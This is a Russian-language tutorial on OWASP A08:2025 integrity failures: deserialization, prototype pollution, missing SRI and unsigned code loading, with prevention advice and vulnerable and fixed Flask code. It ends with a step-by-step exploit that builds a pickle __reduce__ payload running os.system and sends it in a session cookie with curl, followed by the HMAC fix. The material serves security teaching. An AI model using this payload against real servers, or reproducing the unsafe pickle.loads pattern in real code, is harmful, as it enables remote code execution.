# A08:2025 Software or Data Integrity Failures

## Контекст и базовые понятия

Категория **Software or Data Integrity Failures** (A08) в OWASP Top 10:2025 объединяет уязвимости, возникающие, когда приложение рассматривает ненадёжные или изменённые данные либо код как доверенные и допустимые [5]. Это приводит к выполнению произвольного кода, обходу аутентификации, подмене данных или отказу в обслуживании. Ключевое отличие категории — не отсутствие криптографии как таковой, а недостаточная проверка целостности и подлинности получаемых объектов или ресурсов.

Определение OWASP формулирует проблему как «связанную с кодом и инфраструктурой, которая не защищает от трактовки недопустимого или недоверенного кода/данных как доверенных и валидных» [5]. Типовой пример из официального описания — приложение, полагающееся на плагины, библиотеки или модули из недоверенных источников, репозиториев и CDN без проверки их целостности [5][6].

В OWASP Top 10 2021 аналогичная категория уже присутствовала под тем же названием, однако в редакции 2025 года её формулировка и охват уточнены: теперь она явно включает не только ненадёжную десериализацию, но и прототипное загрязнение, отсутствие проверки целостности внешних ресурсов и загрузку кода без проверки подписи [3][5]. Категория сохранила восьмой номер, но её значимость в контексте современных атак на цепочки доставки и рантайм-окружение возросла.

**Целостность** в контексте A08 означает, что данные или код не были изменены несанкционированно. Для программного обеспечения это включает проверку подписи обновлений, контроль хешей загружаемых библиотек и плагинов, а для данных — проверку подлинности и неизменности пользовательского ввода, сериализованных объектов, параметров запросов и файлов cookie.

Категорию A08 часто путают с соседними категориями OWASP Top 10:2025. Разграничение принципиально, поскольку определяет стратегию защиты и приоритеты при разработке.

| Категория OWASP 2025 | Фокус угрозы | Типичные сценарии | Отличие от A08 |
|----------------------|--------------|-------------------|----------------|
| **A03 Software Supply Chain Failures** | Проблемы в процессе поставки ПО: заражённые зависимости, взлом CI/CD, подмена пакетов | Dependency confusion, typosquatting, вредоносные обновления | A03 — о компрометации на этапе разработки/доставки, A08 — о доверии к данным и коду в рантайме независимо от их происхождения |
| **A04 Cryptographic Failures** | Некорректное применение криптографии: слабые алгоритмы, утечки ключей, отсутствие TLS | Передача паролей по HTTP, использование MD5 для хеширования | A08 может требовать криптографических проверок, но корень проблемы — их отсутствие или неверная логика, а не слабость алгоритма |
| **A05 Injection** | Внедрение команд или кода через пользовательский ввод (SQL, XSS, OS command) | SQL-инъекция в форму логина, XSS в комментариях | Десериализация в A08 тоже приводит к выполнению кода, но механизм основан на восстановлении объектов, а не на интерпретации строки |
| **A06 Insecure Design** | Архитектурные просчёты, неверные предположения о доверии | Отсутствие rate limiting, доверие к клиентским проверкам | A08 — конкретный класс сбоя целостности; A06 шире и может быть первопричиной |

Таким образом, A08 следует рассматривать как категорию «доверия»: приложение недостаточно проверяет, что получаемый объект, данные или код действительно являются тем, чем кажутся, и не были подменены.

## Внутреннее устройство предмета

Категория A08:2025 охватывает несколько технических механизмов нарушения целостности. Ниже перечислены ключевые элементы, которые специалист по безопасности должен распознавать.

### 1. Ненадёжная десериализация

Самый известный представитель категории. Приложение принимает сериализованные данные (PHP `serialize`, Python `pickle`, Java `ObjectInputStream`, .NET `BinaryFormatter` и др.) и восстанавливает объекты без проверки того, что данные поступили из доверенного источника. Злоумышленник, способный контролировать сериализованную строку, может сконструировать такую последовательность, которая при десериализации вызовет нежелательные методы класса (гаджет-цепочки). Это приводит к удалённому выполнению кода (RCE), отказу в обслуживании, обходу аутентификации или подмене данных. CWE-502 — Deserialization of Untrusted Data [5][6].

Классический пример — Python-приложение, использующее модуль `pickle` для обработки данных из cookie или параметра запроса.

### 2. Прототипное загрязнение (Prototype Pollution)

Уязвимость, характерная для JavaScript-приложений. При небезопасной рекурсивной функции слияния объектов (`merge`, `extend`) злоумышленник может передать ключ `__proto__` и изменить прототип всех объектов в приложении. Это нарушает целостность данных на уровне всей среды исполнения, позволяя влиять на логику, обходить проверки или внедрять свойства в объекты. CWE-1321 [6].

### 3. Отсутствие проверки целостности внешних ресурсов (Missing Subresource Integrity)

Веб-страницы часто подключают скрипты, стили или шрифты с CDN или сторонних доменов. Если тег `<script>` или `<link>` не содержит атрибута `integrity` с криптографическим хешем ресурса, браузер выполнит любой код, загруженный с этого URL. Компрометация CDN, MITM-атака или DNS-перехват позволяют подменить ресурс и выполнить произвольный JavaScript в контексте основного сайта. Это прямое нарушение целостности программного обеспечения, доставляемого в браузер [5].

### 4. Загрузка кода без проверки подписи или хеша

Приложение или его компоненты (обновления, плагины, модули) загружаются из сети без проверки цифровой подписи или ожидаемого хеша. Атакующий, способный вклиниться в канал доставки (через взлом репозитория, MITM или подмену DNS), может распространить вредоносный код, который будет установлен и выполнен доверяющей стороной. CWE-494 (Download of Code Without Integrity Check) [5][6].

### 5. Недостаточная проверка подлинности данных

Сюда входят случаи, когда приложение использует данные из недоверенных источников (HTTP-заголовки, файлы cookie, параметры запроса) без проверки их подлинности и целостности. Например, cookie сессии содержит роль пользователя, подписанную ненадёжным способом или вообще без подписи; злоумышленник может изменить роль и получить повышенные привилегии. CWE-345 (Insufficient Verification of Data Authenticity) [5].

Структурная схема типового сценария атаки:

```text
[Атакующий] ── создаёт поддельные данные/код ──▶ [Точка ввода приложения]
                                                    │
                                                    ▼
                                          [Приложение доверяет данным/коду
                                           без проверки целостности]
                                                    │
                                                    ▼
                                          [Исполнение/использование]
                                                    │
                                                    ▼
                              [Компрометация: RCE, обход аутентификации,
                                    подмена данных, DoS]
```

Сводная таблица ключевых подтипов:

| Подтип уязвимости | Условия возникновения | Типичные индикаторы | Контрмеры |
|-------------------|------------------------|---------------------|-----------|
| Ненадёжная десериализация | Приём сериализованных данных из недоверенного источника | Наличие параметров типа `data=`, `cookie=`, содержащих сериализованные данные | Использовать безопасные форматы (JSON), белые списки классов, подпись данных |
| Прототипное загрязнение | Небезопасный `merge`/`extend` объектов, обработка JSON от клиента | Наличие операций рекурсивного слияния, сообщения об ошибках с `__proto__` | Использовать `Object.freeze` для прототипов, отбрасывать ключи `__proto__`, применять безопасные библиотеки |
| Отсутствие SRI | Подключение внешних скриптов/стилей без атрибута `integrity` | `<script src="https://cdn...">` без `integrity` | Добавить SRI-хеш с SHA-256/384/512 |
| Загрузка кода без проверки | Механизм обновления или установки плагинов без проверки подписи | Отсутствие проверки хеша/подписи в коде обновления | Внедрить проверку цифровой подписи, использовать TUF |
| Недостаточная проверка подлинности данных | Использование клиентских данных без подписи или с предсказуемой подписью | Cookie с ролью без HMAC, параметры, влияющие на логику | Подписывать данные HMAC или цифровой подписью, проверять перед использованием |

## Применение и работа с предметом

Работа с категорией A08 в практике SOC L1 и разработки включает выявление уязвимостей, тестирование, предотвращение и мониторинг инцидентов.

### Выявление и анализ

**Анализ исходного кода (SAST)** — поиск вызовов потенциально опасных функций десериализации: `pickle.loads`, `yaml.load` без `SafeLoader`, `unserialize`, `ObjectInputStream`, `eval` с недоверенными данными. Инструменты: Semgrep, CodeQL, SonarQube, PVS-Studio. Правила должны искать как прямые вызовы, так и кастомные обёртки. Для JavaScript проверяются функции `merge`, `extend`, `deepExtend` без защиты от `__proto__`. SAST также выявляет отсутствие SRI-атрибутов в HTML-шаблонах, если поддерживает такой анализ [3][6].

**Динамический анализ (DAST)** — отправка тестовых payload в параметры приложения. Для десериализации используются готовые генераторы: `ysoserial` для Java, `phpggc` для PHP, `ysoserial.net` для .NET. Они генерируют сериализованные объекты, вызывающие выполнение команд. Тестировщик подставляет payload в подозрительные поля (cookie, POST-параметры, заголовки) и наблюдает за ответом или побочными эффектами. Инструменты DAST: Burp Suite, OWASP ZAP. Для проверки SRI сканер может анализировать HTML и отмечать внешние ресурсы без `integrity`.

**Фаззинг десериализации** — автоматизированная подача мутированных сериализованных данных с целью вызвать исключения или необычное поведение. Инструменты вроде `AFL` с обёртками для десериализаторов позволяют находить новые гаджет-цепочки.

**Проверка целостности внешних ресурсов** — ручная или автоматизированная проверка HTML на наличие атрибута `integrity` у всех `<script src="...">` и `<link rel="stylesheet" href="...">`, загружаемых с разных доменов. Плагины браузера (например, SRI Hash Generator) позволяют вычислить хеш.

### Предотвращение

- **Безопасные форматы сериализации**: вместо бинарных или нативных форматов (pickle, Java serialization, BinaryFormatter) использовать JSON, protobuf, XML с ограничениями. Для YAML — всегда `yaml.safe_load` или аналоги.
- **Десериализация с белым списком классов**: в Java применять `ObjectInputFilter` для ограничения допустимых классов; в .NET — `SerializationBinder`; в PHP — использовать `allowed_classes` в `unserialize`.
- **Подпись сериализованных данных**: подписывать данные HMAC с секретным ключом или цифровой подписью, проверять подпись до десериализации. Это гарантирует, что данные не были изменены, но не защищает от атак с использованием легитимно подписанных данных (если секрет утёк).
- **Целостность внешних ресурсов (SRI)**: вычислять хеш ресурса и добавлять атрибут `integrity` со значением `sha256-...`. Браузер сверит хеш и не выполнит ресурс при несовпадении.
- **Проверка целостности загружаемого кода**: для обновлений и плагинов проверять цифровую подпись (Ed25519, ECDSA), а не только хеш (хеш не защищает от подмены при MITM, если канал не защищён). Использование TLS обязательно. Для систем обновления рекомендуется The Update Framework (TUF) — фреймворк, обеспечивающий защиту от rollback, mix-and-match и других атак на цепочку обновлений.
- **Защита от прототипного загрязнения**: избегать рекурсивного слияния объектов из недоверенных данных; использовать `Object.freeze(Object.prototype)`; применять библиотеки, исправленные от CVE-2019-10744 (lodash >=4.17.12); фильтровать ключи `__proto__`, `constructor`, `prototype`.
- **Мониторинг**: журналировать попытки десериализации недоверенных данных, особенно ошибки типов и исключения. В SIEM настроить корреляции на подозрительные payload (например, большое количество base64-данных в параметрах). EDR может детектировать аномальное поведение процессов, вызванное RCE.

### Пример безопасного и уязвимого кода

Уязвимый фрагмент на Python (Flask) с использованием `pickle`:

```python
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route('/load')
def load_data():
    data = request.args.get('data')
    obj = pickle.loads(base64.b64decode(data))  # опасная десериализация
    return str(obj)
```

Безопасный вариант с JSON и HMAC-подписью:

```python
import json
import hmac
import hashlib
from flask import Flask, request, abort

app = Flask(__name__)
SECRET_KEY = b'секретный-ключ'

@app.route('/load')
def load_data():
    data = request.args.get('data')
    signature = request.args.get('sig')
    if not signature:
        abort(400)
    expected = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, signature):
        abort(403)
    obj = json.loads(data)
    return str(obj)
```

Конфигурация SRI для внешнего скрипта:

```html
<script src="https://cdn.example.com/library.js"
        integrity="sha384-<вычисленный-хеш>"
        crossorigin="anonymous"></script>
```

Хеш вычисляется командой:

```bash
openssl dgst -sha384 -binary library.js | openssl base64 -A
```

## Сквозной практический пример: эксплуатация и устранение ненадёжной десериализации

**Исходные условия.** Веб-приложение на Python Flask использует cookie сессии, в которой хранится сериализованный объект через `pickle` без подписи. Злоумышленник — обычный пользователь с доступом к приложению через браузер.

### Шаг 1. Анализ cookie и идентификация формата

Злоумышленник получает cookie из браузера (например, через DevTools). Значение выглядит как base64-строка. Декодирует её:

```bash
echo "gASVBQAAAAAAAAB9lC4=" | base64 -d | xxd
```

Вывод (иллюстративная схема):

```text
00000000: 80 04 95 05 00 00 00 00 00 7d 94 2e  ............}..
```

Байты `80 04` — это маркер протокола pickle версии 4. Это указывает, что cookie содержит pickle-объект.

### Шаг 2. Создание вредоносного payload

Злоумышленник создаёт скрипт, который сериализует объект, выполняющий команду `id` на сервере при десериализации:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

Запускает:

```bash
python3 exploit.py
```

Получает строку, например: `gASVJgAAAAAAAACMCGJ1aWx0aW5zlIwFcG9zaXiUjARzeXN0ZW2Uk5SMCmlklIWUUpQu`

### Шаг 3. Отправка запроса с поддельным cookie

Злоумышленник отправляет HTTP-запрос, подставляя payload в cookie:

```bash
curl -s http://target/ -H "Cookie: session=gASVJgAAAAAAAACMCGJ1aWx0aW5zlIwFcG9zaXiUjARzeXN0ZW2Uk5SMCmlklIWUUpQu"
```

Сервер выполняет `os.system('id')` при десериализации. Если приложение возвращает результат (например, отображает содержимое объекта после десериализации), в ответе появится строка с UID пользователя, под которым работает Flask (например, `uid=1000(flask) gid=1000(flask) groups=1000(flask)`). Если вывод не передаётся клиенту, атакующий может модифицировать payload для записи результата в файл или обратного соединения.

### Шаг 4. Подтверждение компрометации через логи

В логах приложения фиксируется выполнение команды. Фрагмент `/var/log/app.log`:

```text
2026-09-16 14:22:31 INFO app: command executed: id
2026-09-16 14:22:31 INFO app: result: uid=1000(flask) gid=1000(flask) groups=1000(flask)
```

Или срабатывает EDR на необычное поведение процесса Flask (запуск дочернего процесса `id`).

### Шаг 5. Устранение уязвимости

Разработчик заменяет pickle на JSON с HMAC-подписью (код из раздела 3). После развёртывания исправления злоумышленник повторяет атаку с прежним payload — сервер возвращает `403 Forbidden`, поскольку подпись не совпадает.

**Ожидаемый вывод.** Пример демонстрирует, как отсутствие проверки целостности сериализованных данных приводит к удалённому выполнению кода, и как внедрение подписи и безопасного формата данных устраняет уязвимость.
